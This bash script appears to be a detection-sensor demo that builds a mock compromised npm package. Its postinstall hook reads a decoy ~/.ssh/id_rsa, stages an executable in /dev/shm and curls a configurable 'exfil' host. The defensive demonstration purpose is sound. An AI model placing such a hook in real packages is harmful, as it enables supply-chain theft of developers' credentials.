#!/usr/bin/env bash
# SecRisk demo: a compromised npm package with a malicious postinstall.
#
# Run this in a SECOND terminal while the sensor is running in the first.
# Everything happens under /tmp/secrisk-demo — no real credentials are read,
# nothing outside that directory is touched, and npm runs --offline against a
# local tarball, so no registry is contacted.
#
# The chain it produces, and the sensor that catches each step:
#   1. exec    npm -> sh -c -> postinstall.sh           (process sensor, ppid lineage)
#   2. file    reads .../\.ssh/id_rsa                   (file sensor, reason=secret_read)
#   3. file    writes /dev/shm/.update-cache            (file sensor, staging path)
#   4. exec    curl                                     (process sensor)
#   5. net     outbound TCP connect                     (network sensor)
# All five share one pid lineage, anchored at the real npm process — that link
# is what the correlation engine scores.

set -u

DEMO_DIR=/tmp/secrisk-demo
PKG_DIR="$DEMO_DIR/left-pad"       # the package source, as the attacker published it
APP_DIR="$DEMO_DIR/app"            # the victim project that depends on it
FAKE_HOME="$DEMO_DIR/home"
STAGED=/dev/shm/.update-cache
EXFIL_HOST="${EXFIL_HOST:-example.com}"

# Seconds to pause between the payload's steps. The attack itself takes about a
# tenth of a second, which is unwatchable when someone is narrating it — the
# pause spreads the five events out so each one can be pointed at as it lands.
# Set STEP_PAUSE=0 for automated runs where nobody is watching.
STEP_PAUSE="${STEP_PAUSE:-1}"

cleanup() {
    rm -rf "$DEMO_DIR" "$STAGED"
}

command -v npm >/dev/null 2>&1 || { echo "npm is not installed" >&2; exit 1; }

# --- Set up the fake compromised package -----------------------------------
cleanup
mkdir -p "$PKG_DIR" "$APP_DIR" "$FAKE_HOME/.ssh"

# A decoy private key. Suffix `id_rsa` is what the file sensor watchlists.
cat > "$FAKE_HOME/.ssh/id_rsa" <<'KEY'
-----BEGIN OPENSSH PRIVATE KEY-----
NOT-A-REAL-KEY-THIS-IS-SECRISK-DEMO-DECOY-DATA
-----END OPENSSH PRIVATE KEY-----
KEY
chmod 600 "$FAKE_HOME/.ssh/id_rsa"

# The malicious postinstall hook — the payload of the "compromised" package.
cat > "$PKG_DIR/postinstall.sh" <<PAYLOAD
#!/bin/sh
# Step 2: read the developer's SSH private key  -> file/secret_read
echo "    [payload] reading ~/.ssh/id_rsa"
cat "$FAKE_HOME/.ssh/id_rsa" > /dev/null
sleep $STEP_PAUSE

# Step 3: stage a payload in shared memory      -> file/write
echo "    [payload] staging an implant in /dev/shm"
echo "staged-implant-bytes" > "$STAGED"
chmod +x "$STAGED"
sleep $STEP_PAUSE

# Steps 4+5: exec curl, which connects outbound -> exec + net
echo "    [payload] calling home to $EXFIL_HOST"
curl -s -o /dev/null --max-time 5 "http://$EXFIL_HOST/" || true
PAYLOAD
chmod +x "$PKG_DIR/postinstall.sh"

cat > "$PKG_DIR/package.json" <<'PKG'
{
  "name": "left-pad",
  "version": "1.3.1",
  "scripts": { "postinstall": "./postinstall.sh" }
}
PKG

# Pack it the way it would sit on the registry. npm pack keeps the exec bit, so
# the hook runs the payload by path from node_modules under /tmp.
TARBALL="$DEMO_DIR/$(cd "$PKG_DIR" && npm pack --silent --pack-destination "$DEMO_DIR")"

# Recent npm (12 here) blocks dependency install scripts unless package.json
# allows them. The victim approved this package before it was compromised, and
# the attack rides on that trust. (For a local tarball the entry is keyed by its spec.)
cat > "$APP_DIR/package.json" <<APP
{
  "name": "victim-app",
  "version": "1.0.0",
  "private": true,
  "allowScripts": { "file:$TARBALL": true }
}
APP

# --- Run it ----------------------------------------------------------------
echo "[*] Simulating: npm install left-pad  (with compromised postinstall)"
echo "[*] Watch the sensor terminal for the exec -> secret_read -> write -> net chain."
echo

( cd "$APP_DIR" && npm install --offline --no-audit --no-fund --foreground-scripts \
    --cache "$DEMO_DIR/npm-cache" "$TARBALL" )

echo
echo "[*] Done. Chain complete."
echo "[*] Cleaning up $DEMO_DIR and $STAGED"
cleanup
